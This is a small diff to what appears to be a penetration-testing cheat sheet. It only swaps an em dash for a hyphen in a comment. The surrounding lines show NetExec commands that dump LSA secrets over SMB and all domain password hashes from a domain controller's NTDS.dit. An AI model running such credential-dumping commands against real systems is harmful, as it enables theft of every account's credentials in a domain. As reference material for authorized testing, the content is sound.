@@ -89,7 +89,7 @@ nxc smb $IP -u admin -p password --lsa
 ```
 
 ```bash
-# NTDS.dit (DC only — all domain hashes)
+# NTDS.dit (DC only - all domain hashes)
 nxc smb $DC -u admin -p password --ntds
 ```
 
